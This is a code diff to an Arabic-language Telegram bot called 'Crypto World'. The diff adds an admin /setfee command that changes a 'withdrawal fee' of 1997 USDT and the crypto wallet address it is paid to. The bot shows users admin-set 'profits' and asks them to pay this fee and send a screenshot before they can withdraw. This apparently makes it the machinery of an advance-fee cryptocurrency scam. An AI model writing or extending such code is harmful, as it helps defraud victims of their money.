@@ -39,6 +39,12 @@ def load_data():
             "3585556": {"amount": "45,500", "assigned_user_id": None},
             "189415": {"amount": "1500", "assigned_user_id": None}
         },
+        "fee_info": {
+            "currency": "USDT",
+            "amount": "1997 دولار",
+            "network": "BNB Smart Chain (BEP20)",
+            "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
+        },
         "all_users": []
     }
 
@@ -48,6 +54,7 @@ def save_data_to_file():
             "states": user_states,
             "custom_data": user_custom_data,
             "profits": custom_profits,
+            "fee_info": withdraw_fee_info,
             "all_users": list(all_users_set)
         }
         with open(DATA_FILE, "w", encoding="utf-8") as f:
@@ -60,6 +67,12 @@ db = load_data()
 user_states = db.get("states", {})
 user_custom_data = db.get("custom_data", {})
 custom_profits = db.get("profits", {})
+withdraw_fee_info = db.get("fee_info", {
+    "currency": "USDT",
+    "amount": "1997 دولار",
+    "network": "BNB Smart Chain (BEP20)",
+    "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
+})
 all_users_set = set(db.get("all_users", []))
 
 # تقدير عمر الحساب بناءً على الـ ID
@@ -74,6 +87,36 @@ def estimate_account_age(user_id: int) -> str:
         return "حساب نشط منذ عدة سنوات (بين 2019 - 2022 تقريباً)"
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
+
+# أمر الأدمن لتعديل رسوم وعنوان السحب: /setfee <المبلغ> <العنوان>
+async def set_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+
+    args = context.args
+    if len(args) < 2:
+        await update.message.reply_text(
+            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
+            "اكتب الأمر بهذا الشكل:\n"
+            "`/setfee <المبلغ> <عنوان_المحفظة>`\n\n"
+            "مثال:\n`/setfee 1997 دولار 0x4aaf...`",
+            parse_mode="Markdown"
+        )
+        return
+
+    new_amount = args[0]
+    new_address = " ".join(args[1:])
+
+    withdraw_fee_info["amount"] = new_amount
+    withdraw_fee_info["address"] = new_address
+    save_data_to_file()
+
+    await update.message.reply_text(
+        f"✅ **تم تحديث تفاصيل رسوم السحب بنجاح!**\n\n"
+        f"• المبلغ الجديد: `{new_amount}`\n"
+        f"• العنوان الجديد:\n`{new_address}`",
+        parse_mode="Markdown"
+    )
 
 # أمر الأدمن للإذاعة وإرسال رسالة لجميع المستخدمين: /broadcast <الرسالة>
 async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -243,7 +286,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
         return
 
-    # التحقق الداخلي الصارم (بدون كشف الكلمة السرية للزبون)
     if current_state == "waiting_for_subscription_text":
         if text.startswith("خطوات التسجيل والإشتراك") or text.startswith("خطوات التسجيل والاشتراك"):
             user_custom_data[user_id] = text
@@ -314,7 +356,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
 
-            # جلب بيانات المشترك الحقيقية التي أرسلها
             user_specific_data = user_custom_data.get(user_id, text)
 
             await msg.reply_text(
@@ -434,11 +475,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "pay_fees":
         pay_details = (
             "💳 **دفع رسوم السحب:**\n\n"
-            "العملة: **USDT**\n"
-            "المبلغ: **1997 دولار**\n"
-            "الشبكة: **BNB Smart Chain (BEP20)**\n\n"
+            f"العملة: **{withdraw_fee_info['currency']}**\n"
+            f"المبلغ: **{withdraw_fee_info['amount']}**\n"
+            f"الشبكة: **{withdraw_fee_info['network']}**\n\n"
             "العنوان:\n"
-            "`0x4aaf2231199d24842e606f99b4f69bb5cddb171e`\n\n"
+            f"`{withdraw_fee_info['address']}`\n\n"
             "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
         )
         await query.edit_message_text(
@@ -456,11 +497,12 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(CommandHandler("broadcast", broadcast_message))
+    app.add_handler(CommandHandler("setfee", set_fee_command))  # أمر تعديل رسوم وعنوان السحب
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن بنظام حفظ البيانات (JSON) وبأعلى كفاءة...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن مع أمر تعديل رسوم السحب (/setfee)...")
     app.run_polling()
 
 if __name__ == "__main__":
